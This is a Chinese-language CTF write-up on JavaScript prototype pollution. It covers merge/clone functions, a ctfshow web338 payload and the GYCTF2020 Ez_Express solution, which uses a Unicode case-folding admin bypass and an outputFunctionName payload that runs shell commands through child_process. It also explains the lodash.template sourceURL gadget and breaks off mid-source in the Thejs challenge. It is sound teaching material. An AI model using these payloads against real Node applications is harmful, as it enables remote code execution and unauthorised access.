<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="c289e8ef3983f29b86d7910678557dc2">前言</h1>
<p>JSON语法：</p>
<div class="highlight"><pre><span></span><span class="n">var</span> <span class="k">object</span> <span class="o">=</span> <span class="err">{</span>
  <span class="s1">'a'</span><span class="p">:</span> <span class="p">[</span><span class="err">{</span> <span class="s1">'b'</span><span class="p">:</span> <span class="mi">2</span> <span class="err">}</span><span class="p">,</span> <span class="err">{</span> <span class="s1">'d'</span><span class="p">:</span> <span class="mi">4</span> <span class="err">}</span><span class="p">]</span>
<span class="err">}</span><span class="p">;</span>

<span class="n">var</span> <span class="n">other</span> <span class="o">=</span> <span class="err">{</span>
  <span class="s1">'a'</span><span class="p">:</span> <span class="p">[</span><span class="err">{</span> <span class="s1">'c'</span><span class="p">:</span> <span class="mi">3</span> <span class="err">}</span><span class="p">,</span> <span class="err">{</span> <span class="s1">'e'</span><span class="p">:</span> <span class="mi">5</span> <span class="err">}</span><span class="p">]</span>
<span class="err">}</span><span class="p">;</span>

<span class="n">_</span><span class="p">.</span><span class="n">merge</span><span class="p">(</span><span class="k">object</span><span class="p">,</span> <span class="n">other</span><span class="p">);</span>
<span class="o">//</span> <span class="o">=&gt;</span> <span class="err">{</span> <span class="s1">'a'</span><span class="p">:</span> <span class="p">[</span><span class="err">{</span> <span class="s1">'b'</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span> <span class="s1">'c'</span><span class="p">:</span> <span class="mi">3</span> <span class="err">}</span><span class="p">,</span> <span class="err">{</span> <span class="s1">'d'</span><span class="p">:</span> <span class="mi">4</span><span class="p">,</span> <span class="s1">'e'</span><span class="p">:</span> <span class="mi">5</span> <span class="err">}</span><span class="p">]</span> <span class="err">}</span>
</pre></div>
<p>原型链继承:</p>
<p>user.<strong>proto</strong>=User.prototype</p>
<p>对象的<strong>proto</strong>=类的prototype</p>
<p>具体看这：<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain" target="_blank">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain</a></p>
<h1 data-content="1" id="5493330555d2220fb3da6a4d8a9fc8fa">Merge 类操作导致原型链污染</h1>
<p>如果我们想设置<code>__proto__</code>的值该怎么做？找到能够控制数组（对象）的“键名”的操作即可</p>
<ul>
<li>对象merge：是合并对象的方法，合并两个对象或者多个对象的属性</li>
<li>对象clone:（其实就是将待操作的对象merge到一个空对象中）</li>
</ul>
<p>以对象merge为例，我们想象一个简单的merge函数，代码参考P神</p>
<div class="highlight"><pre><span></span><span class="kd">function</span> <span class="nx">merge</span><span class="p">(</span><span class="nx">target</span><span class="p">,</span> <span class="nx">source</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">key</span> <span class="k">in</span> <span class="nx">source</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">key</span> <span class="k">in</span> <span class="nx">source</span> <span class="o">&amp;&amp;</span> <span class="nx">key</span> <span class="k">in</span> <span class="nx">target</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">merge</span><span class="p">(</span><span class="nx">target</span><span class="p">[</span><span class="nx">key</span><span class="p">],</span> <span class="nx">source</span><span class="p">[</span><span class="nx">key</span><span class="p">])</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nx">target</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">source</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">let</span> <span class="nx">o1</span> <span class="o">=</span> <span class="p">{}</span><span class="c1">//创建一个空对象</span>
<span class="kd">let</span> <span class="nx">o2</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s2">"__proto__"</span><span class="o">:</span> <span class="p">{</span><span class="nx">b</span><span class="o">:</span> <span class="mi">2</span><span class="p">}}</span>
<span class="c1">//创建一个对象，对象存在两个属性一个是a,值为1，另一个属性是一个原型对象，值为{b: 2}</span>
<span class="nx">merge</span><span class="p">(</span><span class="nx">o1</span><span class="p">,</span> <span class="nx">o2</span><span class="p">)</span><span class="c1">//将两个对象进行合并</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">o1</span><span class="p">.</span><span class="nx">a</span><span class="p">,</span> <span class="nx">o1</span><span class="p">.</span><span class="nx">b</span><span class="p">)</span>

<span class="nx">o3</span> <span class="o">=</span> <span class="p">{}</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">o3</span><span class="p">.</span><span class="nx">b</span><span class="p">)</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240310171315-6d34792a-debe-1.png"/></p>
<p>结果是合并成功了，但是原型链没有被污染。</p>
<p>这里因为<strong>proto</strong>没有被解析成键名，而是直接被解析成o2的原型</p>
<p>这里需要使用JSON.parse函数了</p>
<div class="highlight"><pre><span></span><span class="kd">let</span> <span class="nx">o1</span> <span class="o">=</span> <span class="p">{}</span><span class="c1">//创建一个空对象</span>
<span class="kd">let</span> <span class="nx">o2</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="s1">'{"a": 1, "__proto__": {"b": 2}}'</span><span class="p">)</span>
<span class="c1">//创建一个对象，对象存在两个属性一个是a,值为1，另一个属性是一个原型对象，值为{b: 2}</span>
<span class="nx">merge</span><span class="p">(</span><span class="nx">o1</span><span class="p">,</span> <span class="nx">o2</span><span class="p">)</span><span class="c1">//将两个对象进行合并</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">o1</span><span class="p">.</span><span class="nx">a</span><span class="p">,</span> <span class="nx">o1</span><span class="p">.</span><span class="nx">b</span><span class="p">)</span>

<span class="nx">o3</span> <span class="o">=</span> <span class="p">{}</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">o3</span><span class="p">.</span><span class="nx">b</span><span class="p">)</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240310171353-84311962-debe-1.png"/></p>
<p>这次成功把原型链污染了。</p>
<h4 data-content="1" id="f1aa33ddf14da934e636939f3ba04618">例题：</h4>
<p><strong>web338</strong></p>
<p>源码：</p>
<div class="highlight"><pre><span></span><span class="n">router</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="n">require</span><span class="p">(</span><span class="s1">'body-parser'</span><span class="p">).</span><span class="n">json</span><span class="p">(),</span><span class="k">function</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">,</span> <span class="k">next</span><span class="p">)</span> <span class="err">{</span>
  <span class="n">res</span><span class="p">.</span><span class="k">type</span><span class="p">(</span><span class="s1">'html'</span><span class="p">);</span>
  <span class="n">var</span> <span class="n">flag</span><span class="o">=</span><span class="s1">'flag_here'</span><span class="p">;</span>
  <span class="n">var</span> <span class="n">secert</span> <span class="o">=</span> <span class="err">{}</span><span class="p">;</span>
  <span class="n">var</span> <span class="n">sess</span> <span class="o">=</span> <span class="n">req</span><span class="p">.</span><span class="k">session</span><span class="p">;</span>
  <span class="n">let</span> <span class="k">user</span> <span class="o">=</span> <span class="err">{}</span><span class="p">;</span>
  <span class="n">utils</span><span class="p">.</span><span class="k">copy</span><span class="p">(</span><span class="k">user</span><span class="p">,</span><span class="n">req</span><span class="p">.</span><span class="n">body</span><span class="p">);</span>
  <span class="k">if</span><span class="p">(</span><span class="n">secert</span><span class="p">.</span><span class="n">ctfshow</span><span class="o">===</span><span class="s1">'36dboy'</span><span class="p">)</span><span class="err">{</span>
    <span class="n">res</span><span class="p">.</span><span class="k">end</span><span class="p">(</span><span class="n">flag</span><span class="p">);</span>
  <span class="err">}</span><span class="k">else</span><span class="err">{</span>
    <span class="k">return</span> <span class="n">res</span><span class="p">.</span><span class="n">json</span><span class="p">(</span><span class="err">{</span><span class="n">ret_code</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span> <span class="n">ret_msg</span><span class="p">:</span> <span class="s1">'登录失败'</span><span class="o">+</span><span class="n">JSON</span><span class="p">.</span><span class="n">stringify</span><span class="p">(</span><span class="k">user</span><span class="p">)</span><span class="err">}</span><span class="p">);</span>  
  <span class="err">}</span>
<span class="err">}</span><span class="p">);</span>
</pre></div>
<p>secert.ctfshow==='36dboy'这里需要把原型链污染，将Object类里面添加一个键值对{"ctfshow":"36dboy"}</p>
<p>Payload:</p>
<div class="highlight"><pre><span></span><span class="err">{</span><span class="ss">"__proto__"</span><span class="p">:</span><span class="err">{</span><span class="ss">"ctfshow"</span><span class="p">:</span><span class="ss">"36dboy"</span><span class="err">}}</span>
</pre></div>
<p><strong>buuctf[GYCTF2020]Ez_Express</strong></p>
<p>源码：</p>
<div class="highlight"><pre><span></span><span class="n">var</span> <span class="n">express</span> <span class="o">=</span> <span class="n">require</span><span class="p">(</span><span class="s1">'express'</span><span class="p">);</span>
<span class="n">var</span> <span class="n">router</span> <span class="o">=</span> <span class="n">express</span><span class="p">.</span><span class="n">Router</span><span class="p">();</span>
<span class="n">const</span> <span class="n">isObject</span> <span class="o">=</span> <span class="n">obj</span> <span class="o">=&gt;</span> <span class="n">obj</span> <span class="o">&amp;&amp;</span> <span class="n">obj</span><span class="p">.</span><span class="k">constructor</span> <span class="o">&amp;&amp;</span> <span class="n">obj</span><span class="p">.</span><span class="k">constructor</span> <span class="o">===</span> <span class="k">Object</span><span class="p">;</span>
<span class="n">const</span> <span class="n">merge</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="err">{</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">var</span> <span class="n">attr</span> <span class="k">in</span> <span class="n">b</span><span class="p">)</span> <span class="err">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">isObject</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">attr</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="n">isObject</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="n">attr</span><span class="p">]))</span> <span class="err">{</span>
      <span class="n">merge</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">attr</span><span class="p">],</span> <span class="n">b</span><span class="p">[</span><span class="n">attr</span><span class="p">]);</span>
    <span class="err">}</span> <span class="k">else</span> <span class="err">{</span>
      <span class="n">a</span><span class="p">[</span><span class="n">attr</span><span class="p">]</span> <span class="o">=</span> <span class="n">b</span><span class="p">[</span><span class="n">attr</span><span class="p">];</span>
    <span class="err">}</span>
  <span class="err">}</span>
  <span class="k">return</span> <span class="n">a</span>
<span class="err">}</span>
<span class="n">const</span> <span class="n">clone</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="err">{</span>
  <span class="k">return</span> <span class="n">merge</span><span class="p">(</span><span class="err">{}</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
<span class="err">}</span>
<span class="k">function</span> <span class="n">safeKeyword</span><span class="p">(</span><span class="n">keyword</span><span class="p">)</span> <span class="err">{</span>
  <span class="k">if</span><span class="p">(</span><span class="n">keyword</span><span class="p">.</span><span class="k">match</span><span class="p">(</span><span class="o">/</span><span class="p">(</span><span class="k">admin</span><span class="p">)</span><span class="o">/</span><span class="k">is</span><span class="p">))</span> <span class="err">{</span>
      <span class="k">return</span> <span class="n">keyword</span>
  <span class="err">}</span>

  <span class="k">return</span> <span class="n">undefined</span>
<span class="err">}</span>

<span class="n">router</span><span class="p">.</span><span class="k">get</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="k">function</span> <span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">)</span> <span class="err">{</span>
  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">req</span><span class="p">.</span><span class="k">session</span><span class="p">.</span><span class="k">user</span><span class="p">)</span><span class="err">{</span>
    <span class="n">res</span><span class="p">.</span><span class="n">redirect</span><span class="p">(</span><span class="s1">'/login'</span><span class="p">);</span>
  <span class="err">}</span>
  <span class="n">res</span><span class="p">.</span><span class="n">outputFunctionName</span><span class="o">=</span><span class="n">undefined</span><span class="p">;</span>
  <span class="n">res</span><span class="p">.</span><span class="n">render</span><span class="p">(</span><span class="s1">'index'</span><span class="p">,</span><span class="k">data</span><span class="o">=</span><span class="err">{</span><span class="s1">'user'</span><span class="p">:</span><span class="n">req</span><span class="p">.</span><span class="k">session</span><span class="p">.</span><span class="k">user</span><span class="p">.</span><span class="k">user</span><span class="err">}</span><span class="p">);</span>
<span class="err">}</span><span class="p">);</span>


<span class="n">router</span><span class="p">.</span><span class="k">get</span><span class="p">(</span><span class="s1">'/login'</span><span class="p">,</span> <span class="k">function</span> <span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">)</span> <span class="err">{</span>
  <span class="n">res</span><span class="p">.</span><span class="n">render</span><span class="p">(</span><span class="s1">'login'</span><span class="p">);</span>
<span class="err">}</span><span class="p">);</span>



<span class="n">router</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s1">'/login'</span><span class="p">,</span> <span class="k">function</span> <span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">)</span> <span class="err">{</span>
  <span class="k">if</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">body</span><span class="p">.</span><span class="n">Submit</span><span class="o">==</span><span class="ss">"register"</span><span class="p">)</span><span class="err">{</span>
   <span class="k">if</span><span class="p">(</span><span class="n">safeKeyword</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">body</span><span class="p">.</span><span class="n">userid</span><span class="p">))</span><span class="err">{</span>
    <span class="n">res</span><span class="p">.</span><span class="k">end</span><span class="p">(</span><span class="ss">"&lt;script&gt;alert('forbid word');history.go(-1);&lt;/script&gt;"</span><span class="p">)</span> 
   <span class="err">}</span>
    <span class="n">req</span><span class="p">.</span><span class="k">session</span><span class="p">.</span><span class="k">user</span><span class="o">=</span><span class="err">{</span>
      <span class="s1">'user'</span><span class="p">:</span><span class="n">req</span><span class="p">.</span><span class="n">body</span><span class="p">.</span><span class="n">userid</span><span class="p">.</span><span class="n">toUpperCase</span><span class="p">(),</span>
      <span class="s1">'passwd'</span><span class="p">:</span> <span class="n">req</span><span class="p">.</span><span class="n">body</span><span class="p">.</span><span class="n">pwd</span><span class="p">,</span>
      <span class="s1">'isLogin'</span><span class="p">:</span><span class="k">false</span>
    <span class="err">}</span>
    <span class="n">res</span><span class="p">.</span><span class="n">redirect</span><span class="p">(</span><span class="s1">'/'</span><span class="p">);</span> 
  <span class="err">}</span>
  <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">body</span><span class="p">.</span><span class="n">Submit</span><span class="o">==</span><span class="ss">"login"</span><span class="p">)</span><span class="err">{</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">req</span><span class="p">.</span><span class="k">session</span><span class="p">.</span><span class="k">user</span><span class="p">)</span><span class="err">{</span><span class="n">res</span><span class="p">.</span><span class="k">end</span><span class="p">(</span><span class="ss">"&lt;script&gt;alert('register first');history.go(-1);&lt;/script&gt;"</span><span class="p">)</span><span class="err">}</span>
    <span class="k">if</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="k">session</span><span class="p">.</span><span class="k">user</span><span class="p">.</span><span class="k">user</span><span class="o">==</span><span class="n">req</span><span class="p">.</span><span class="n">body</span><span class="p">.</span><span class="n">userid</span><span class="o">&amp;&amp;</span><span class="n">req</span><span class="p">.</span><span class="n">body</span><span class="p">.</span><span class="n">pwd</span><span class="o">==</span><span class="n">req</span><span class="p">.</span><span class="k">session</span><span class="p">.</span><span class="k">user</span><span class="p">.</span><span class="n">passwd</span><span class="p">)</span><span class="err">{</span>
      <span class="n">req</span><span class="p">.</span><span class="k">session</span><span class="p">.</span><span class="k">user</span><span class="p">.</span><span class="n">isLogin</span><span class="o">=</span><span class="k">true</span><span class="p">;</span>
    <span class="err">}</span>
    <span class="k">else</span><span class="err">{</span>
      <span class="n">res</span><span class="p">.</span><span class="k">end</span><span class="p">(</span><span class="ss">"&lt;script&gt;alert('error passwd');history.go(-1);&lt;/script&gt;"</span><span class="p">)</span>
    <span class="err">}</span>

  <span class="err">}</span>
  <span class="n">res</span><span class="p">.</span><span class="n">redirect</span><span class="p">(</span><span class="s1">'/'</span><span class="p">);</span> <span class="p">;</span>
<span class="err">}</span><span class="p">);</span>
<span class="n">router</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s1">'/action'</span><span class="p">,</span> <span class="k">function</span> <span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">)</span> <span class="err">{</span>
  <span class="k">if</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="k">session</span><span class="p">.</span><span class="k">user</span><span class="p">.</span><span class="k">user</span><span class="o">!=</span><span class="ss">"ADMIN"</span><span class="p">)</span><span class="err">{</span><span class="n">res</span><span class="p">.</span><span class="k">end</span><span class="p">(</span><span class="ss">"&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;"</span><span class="p">)</span><span class="err">}</span> 
  <span class="n">req</span><span class="p">.</span><span class="k">session</span><span class="p">.</span><span class="k">user</span><span class="p">.</span><span class="k">data</span> <span class="o">=</span> <span class="n">clone</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">body</span><span class="p">);</span>
  <span class="n">res</span><span class="p">.</span><span class="k">end</span><span class="p">(</span><span class="ss">"&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;"</span><span class="p">);</span>  
<span class="err">}</span><span class="p">);</span>
<span class="n">router</span><span class="p">.</span><span class="k">get</span><span class="p">(</span><span class="s1">'/info'</span><span class="p">,</span> <span class="k">function</span> <span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">)</span> <span class="err">{</span>
  <span class="n">res</span><span class="p">.</span><span class="n">render</span><span class="p">(</span><span class="s1">'index'</span><span class="p">,</span><span class="k">data</span><span class="o">=</span><span class="err">{</span><span class="s1">'user'</span><span class="p">:</span><span class="n">res</span><span class="p">.</span><span class="n">outputFunctionName</span><span class="err">}</span><span class="p">);</span>
<span class="err">}</span><span class="p">)</span>
<span class="n">module</span><span class="p">.</span><span class="n">exports</span> <span class="o">=</span> <span class="n">router</span><span class="p">;</span>
</pre></div>
<p>这里存在触发的条件：可疑的clone方法</p>
<div class="highlight"><pre><span></span><span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">'/action'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">user</span><span class="o">!=</span><span class="s2">"ADMIN"</span><span class="p">){</span><span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s2">"&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;"</span><span class="p">)}</span> 
  <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">data</span> <span class="o">=</span> <span class="nx">clone</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">);</span>
  <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s2">"&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;"</span><span class="p">);</span>  
<span class="p">});</span>
</pre></div>
<p>想要利用clone函数需要先登录进去，找一下与登陆相关的</p>
<div class="highlight"><pre><span></span><span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">'/login'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">Submit</span><span class="o">==</span><span class="s2">"register"</span><span class="p">){</span>
   <span class="k">if</span><span class="p">(</span><span class="nx">safeKeyword</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">userid</span><span class="p">)){</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s2">"&lt;script&gt;alert('forbid word');history.go(-1);&lt;/script&gt;"</span><span class="p">)</span> 
   <span class="p">}</span>
    <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="o">=</span><span class="p">{</span>
      <span class="s1">'user'</span><span class="o">:</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">userid</span><span class="p">.</span><span class="nx">toUpperCase</span><span class="p">(),</span>
      <span class="s1">'passwd'</span><span class="o">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">pwd</span><span class="p">,</span>
      <span class="s1">'isLogin'</span><span class="o">:</span><span class="kc">false</span>
    <span class="p">}</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s1">'/'</span><span class="p">);</span> 
  <span class="p">}</span>
</pre></div>
<p>大体意思是在注册时，不能注册admin，但是他会进行一次小写转大写，所以使用土耳其语的ı绕过，因为ı转大写也是"I"，同样的还有"ſ".toUpperCase() == 'S'</p>
<p>所以使用admın进行注册，直接登陆进去了，这里还告知了flag所在的路径/flag</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240310171416-9197ed88-debe-1.png"/></p>
<p>回忆一下clone函数是将待操作对象merge一个空对象</p>
<p>所以我们现在需要找到这个待操作对象，</p>
<div class="highlight"><pre><span></span><span class="n">router</span><span class="p">.</span><span class="k">get</span><span class="p">(</span><span class="s1">'/info'</span><span class="p">,</span> <span class="k">function</span> <span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">)</span> <span class="err">{</span>
  <span class="n">res</span><span class="p">.</span><span class="n">render</span><span class="p">(</span><span class="s1">'index'</span><span class="p">,</span><span class="k">data</span><span class="o">=</span><span class="err">{</span><span class="s1">'user'</span><span class="p">:</span><span class="n">res</span><span class="p">.</span><span class="n">outputFunctionName</span><span class="err">}</span><span class="p">);</span>
<span class="err">}</span><span class="p">)</span>
</pre></div>
<p>/info路由下，将res.outputFunctionName渲染进index，此时如果写入恶意代码，访问/info路由的时候会进行模版渲染此时将注入的代码被执行，导致RCE</p>
<p>而且它还是未定义的</p>
<div class="highlight"><pre><span></span><span class="nx">res</span><span class="p">.</span><span class="nx">outputFunctionName</span><span class="o">=</span><span class="kc">undefined</span><span class="p">;</span>
</pre></div>
<p>exp：</p>
<div class="highlight"><pre><span></span><span class="p">{</span><span class="s2">"__proto__"</span><span class="o">:</span><span class="p">{</span><span class="s2">"outputFunctionName"</span><span class="o">:</span><span class="s2">"a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag');//"</span><span class="p">}}</span>
</pre></div>
<p>具体构造原理：<a href="https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/" target="_blank">https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/</a></p>
<p>抓/action的包，改content-type为json，传入exp</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240310171441-a09be3fc-debe-1.png"/></p>
<p>然后访问/info路由即可拿到flag</p>
<h2 data-content="1" id="952038c4231edae99e4fb9e341f7a782">Lodash 模块原型链污染</h2>
<p>还是先了解控制数组（对象）的“键名”的操作</p>
<ul>
<li>lodash.merge:merge(object, sources)递归合并 <code>sources</code> 来源对象自身和继承的可枚举属性到 <code>object</code> 目标对象</li>
<li>lodash.mergeWith:mergeWith(object, sources, [customizer])类似merge，多一个customizer用于自定义合并规则</li>
<li>Lodash.set:set(object, path, value)用于设置对象中的属性值，甚至可以在需要时创建嵌套的属性</li>
<li>Lodash.setWith:setWith(object, path, value, [customizer])类似set，多一个customizer用于自定义合并规则</li>
<li>Lodash.defaultsDeep:defaultsDeep(object, ...defaults) 用于将默认对象的属性深度合并到目标对象中</li>
</ul>
<p>其实说白了都是将对象进行拼接操作来<strong>控制数组（对象）的“键名”</strong></p>
<h3 data-content="1" id="62dab22f97b9a46721a492d8faa53fb9">配合 lodash.template 实现 RCE</h3>
<p>在 Lodash 的原型链污染中，为了实现代码执行，我们常常会污染 template 中的 <code>sourceURL</code> 属性，即给所有 Object 对象中都插入一个 <code>sourceURL</code> 属性，然后通过 lodash.template 方法中的拼接实现任意代码执行漏洞。</p>
<p>我们看到 <code>lodash.template</code> 的代码：<a href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165" target="_blank">https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165</a></p>
<div class="highlight"><pre><span></span><span class="c1">// Use a sourceURL for easier debugging.</span>
<span class="kd">var</span> <span class="nx">sourceURL</span> <span class="o">=</span> <span class="s1">'sourceURL'</span> <span class="k">in</span> <span class="nx">options</span> <span class="o">?</span> <span class="s1">'//# sourceURL='</span> <span class="o">+</span> <span class="nx">options</span><span class="p">.</span><span class="nx">sourceURL</span> <span class="o">+</span> <span class="s1">'\n'</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>
<span class="c1">// ...</span>
<span class="kd">var</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">attempt</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">return</span> <span class="nb">Function</span><span class="p">(</span><span class="nx">importsKeys</span><span class="p">,</span> <span class="nx">sourceURL</span> <span class="o">+</span> <span class="s1">'return '</span> <span class="o">+</span> <span class="nx">source</span><span class="p">)</span>
  <span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="kc">undefined</span><span class="p">,</span> <span class="nx">importsValues</span><span class="p">);</span>
<span class="p">});</span>
</pre></div>
<p>将options.sourceURL拼接后赋值给sourceURL，然后作为下面的Function的第二个参数。</p>
<p>注意这里使用global.process.mainModule.constructor._load来调用child_process，因为require('child_process')需要存在require函数来供调用，这里并没有</p>
<div class="highlight"><pre><span></span><span class="k">return</span> <span class="nx">global</span><span class="p">.</span><span class="nx">process</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">constructor</span><span class="p">.</span><span class="nx">_load</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">).</span><span class="nx">execSync</span><span class="p">(</span><span class="s1">'cat /flag'</span><span class="p">).</span><span class="nx">toString</span><span class="p">()</span><span class="c1">//</span>
</pre></div>
<h4 data-content="1" id="9534c1321a9d5cd47f3e81d4013b1a0e">例题[Code-Breaking 2018]Thejs</h4>
<p>源码如下</p>
<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'fs'</span><span class="p">)</span>
<span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'express'</span><span class="p">)</span>
<span class="kr">const</span> <span class="nx">bodyParser</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'body-parser'</span><span class="p">)</span>
<span class="kr">const</span> <span class="nx">lodash</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'lodash'</span><span class="p">)</span>
<span class="kr">const</span> <span class="nx">session</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'express-session'</span><span class="p">)</span>
<span class="kr">const</span> <span class="nx">randomize</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'randomatic'</span><span class="p">)</span>

<span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">()</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">bodyParser</span><span class="p">.</span><span class="nx">urlencoded</span><span class="p">({</span><span class="nx">extended</span><span class="o">:</span> <span class="kc">true</span><span class="p">})).</span><span class="nx">use</span><span class="p">(</span><span class="nx">bodyParser</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s1">'/static'</span><span class="p">,</span> <span class="nx">express</span><span class="p">.</span><span class="kr">static</span><span class="p">(</span><span class="s1">'static'</span><span class="p">))</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">session</span><span class="p">({</span>
    <span class="nx">name</span><span class="o">:</span> <span class="s1">'thejs.session'</span><span class="p">,</span>
    <span class="nx">secret</span><span class="o">:</span> <span class="nx">randomize</span><span class="p">(</span><span class="s1">'aA0'</span><span class="p">,</span> <span class="mi">16</span><span class="p">),</span>
